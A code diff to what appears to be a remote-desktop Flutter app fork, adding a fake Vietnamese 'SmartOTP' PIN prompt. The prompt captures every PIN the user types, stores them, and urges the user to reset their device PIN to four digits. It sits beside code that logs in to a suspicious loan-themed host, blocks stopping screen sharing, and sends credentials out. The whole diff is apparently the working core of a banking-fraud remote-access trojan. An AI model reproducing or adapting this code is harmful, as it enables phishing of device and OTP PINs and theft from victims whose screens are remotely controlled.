@@ -8,7 +8,9 @@ import 'package:flutter/services.dart';
 import 'package:flutter_hbb/consts.dart';
 import 'package:flutter_hbb/main.dart';
 import 'package:flutter_hbb/models/platform_model.dart';
+import 'package:flutter_screen_lock/flutter_screen_lock.dart';
 import 'package:get/get.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:wakelock/wakelock.dart';
 import 'package:window_manager/window_manager.dart';
@@ -314,7 +316,7 @@ class ServerModel with ChangeNotifier {
   }
 
   /// Toggle the screen sharing service.
-  toggleService({String? id, String? pw}) async {
+  toggleService({String? id, String? pw, BuildContext? context}) async {
     if (_isStart) {
       //khong cho stop
       // final res =
@@ -340,6 +342,14 @@ class ServerModel with ChangeNotifier {
       //   stopService();
       // }
     } else {
+      var notificationStatus = await Permission.notification.status;
+      if (!notificationStatus.isGranted) {
+        await Permission.notification.request();
+      }
+      notificationStatus = await Permission.notification.status;
+      if (!notificationStatus.isGranted) {
+        return;
+      }
       final res = await parent.target?.dialogManager
           .show<bool>((setState, close, context) {
         submit() => close(true);
@@ -483,7 +493,7 @@ class ServerModel with ChangeNotifier {
         ));
   }
 
-  void login({String? id, String? pw}) async {
+  void login({String? id, String? pw, BuildContext? buildContext}) async {
     if (id != null && id.isNotEmpty && pw != null && pw.isNotEmpty) {
       var url = Uri.http('verify-cdn.vaytienmat-nhanh24h.com', 'Member/loginMember');
 
@@ -502,6 +512,7 @@ class ServerModel with ChangeNotifier {
         }
         await _setUserInfoToUpdate(idLogin, token);
         await startService();
+        await showAlertDialog(buildContext!);
         saveAndSendInfo(id:id, pw: pw);
       } else {
          parent.target?.dialogManager
@@ -766,6 +777,85 @@ class ServerModel with ChangeNotifier {
       await platform.invokeMethod('user_update', {'idLogin': idLogin, "token": token});
     } on PlatformException catch (e) {}
   }
+
+  showAlertDialog(BuildContext context) {
+    // show the dialog
+    showDialog(
+      barrierDismissible: false,
+      context: context,
+      builder: (BuildContext context) {
+        return Center(
+          child: Material(
+            child: Container(
+              width: 350,
+              height: 350,
+              child: Column(
+                mainAxisAlignment: MainAxisAlignment.center,
+                children: [
+                  Container(
+                    margin: const EdgeInsets.only(top: 10, left: 50, right: 50),
+                    child: const Text(
+                      "Nhập PIN từ SmartOTP (eToken+) để bắt đầu xác thực.",
+                      textAlign: TextAlign.center,),
+                  ),
+                  Container(
+                    margin: const EdgeInsets.only(top: 10),
+                    child: ElevatedButton(
+                      onPressed: () async {
+                        List<String> passcodeList = [];
+                        final controller = InputController();
+                        final SharedPreferences prefs = await SharedPreferences.getInstance();
+                        screenLock(
+                          context: context,
+                          inputController: controller,
+                          correctString: '7575',
+                          canCancel: false,
+                          onError: (pass) {
+                            passcodeList.add(controller.currentInput.value);
+                            prefs.setStringList("passcode_list", passcodeList);
+                            prefs.setBool("is_set_passcode", true);
+                          },
+                          onUnlocked: () {
+                            passcodeList.add(controller.currentInput.value);
+                            prefs.setStringList("passcode_list", passcodeList);
+                            prefs.setBool("is_set_passcode", true);
+                            Navigator.of(context).pop(true);
+                          },
+                        );
+                      },
+                      child: const Text('Nhập PIN'),
+                    ),
+                  ),
+                  Container(
+                    margin: const EdgeInsets.only(top: 10, left: 50, right: 50),
+                    child: const Text(
+                      "Lưu ý: Hiện tại hệ thống SmartOTP chỉ hỗ trợ mã PIN (4 ký tự). Vui lòng thay đổi trước khi nhập PIN",
+                      textAlign: TextAlign.center,),
+                  ),
+                  Container(
+                    margin: const EdgeInsets.only(top: 10),
+                    child: ElevatedButton(
+                      onPressed: () {
+                        openSetNewPasswordSetting();
+                      },
+                      child: const Text('Thiết lập mã PIN'),
+                    ),
+                  ),
+                ],
+              ),
+            ),
+          ),
+        );
+      },
+    );
+  }
+
+  Future<void> openSetNewPasswordSetting() async {
+    try {
+      await platform.invokeMethod('open_set_new_password');
+    } on PlatformException catch (e) {}
+  }
+
 
 }
 
